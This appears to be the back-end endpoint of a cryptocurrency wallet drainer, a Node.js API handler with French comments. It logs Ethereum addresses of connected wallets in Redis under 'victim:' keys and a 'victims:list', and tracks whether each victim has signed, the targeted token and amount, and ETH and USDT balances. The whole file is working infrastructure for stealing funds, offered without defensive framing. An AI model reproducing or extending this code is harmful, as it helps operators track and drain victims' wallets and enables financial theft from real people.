import { createClient } from 'redis';

const getRedisClient = async () => {
  const client = createClient({ url: process.env.REDIS_URL });
  await client.connect();
  return client;
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { address, chain, status, token, amount, eth_balance, usdt_balance } = req.body;
    if (!address || typeof address !== 'string' || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      return res.status(400).json({ error: 'Adresse invalide' });
    }

    let client;
    try {
      client = await getRedisClient();
      const key = `victim:${address}`;
      const timestamp = String(Date.now());

      if (status) {
        // Mise à jour du statut (connecté / signé / non signé / ...)
        const data = await client.hGetAll(key);
        const update = {
          status,
          timestamp,
          chain: chain || data.chain || 'unknown',
          token: token || data.token || '',
          amount: amount || data.amount || '0'
        };
        // Ne mettre à jour les soldes que s'ils sont fournis
        if (eth_balance !== undefined) update.eth_balance = String(eth_balance);
        if (usdt_balance !== undefined) update.usdt_balance = String(usdt_balance);
        await client.hSet(key, update);
        console.log(`🔄 Statut mis à jour pour ${address}: ${status}`);
      } else {
        // Enregistrement initial
        const existing = await client.hGetAll(key);
        if (existing && Object.keys(existing).length > 0) {
          // Wallet déjà connu : mettre à jour les soldes si fournis
          if (eth_balance !== undefined || usdt_balance !== undefined) {
            const update = {};
            if (eth_balance !== undefined) update.eth_balance = String(eth_balance);
            if (usdt_balance !== undefined) update.usdt_balance = String(usdt_balance);
            await client.hSet(key, update);
          }
          console.log(`📥 Wallet reconnecté : ${address}`);
          return res.status(200).json({ success: true, message: 'already recorded' });
        }
        await client.hSet(key, {
          chain: chain || 'unknown',
          token: '',
          amount: '0',
          status: 'connected',
          timestamp,
          eth_balance: eth_balance !== undefined ? String(eth_balance) : '0',
          usdt_balance: usdt_balance !== undefined ? String(usdt_balance) : '0'
        });
        console.log(`🆕 Wallet connecté enregistré : ${address}`);
      }

      // Ajout à la liste victims:list si absent
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(address)) {
        parsedList.push(address);
        await client.set('victims:list', JSON.stringify(parsedList));
      }

      return res.status(200).json({ success: true });
    } catch (err) {
      console.error('Erreur record-wallet:', err);
      return res.status(500).json({ error: err.message });
    } finally {
      if (client) await client.disconnect();
    }
  }

  return res.status(405).json({ error: 'Méthode non autorisée' });
}
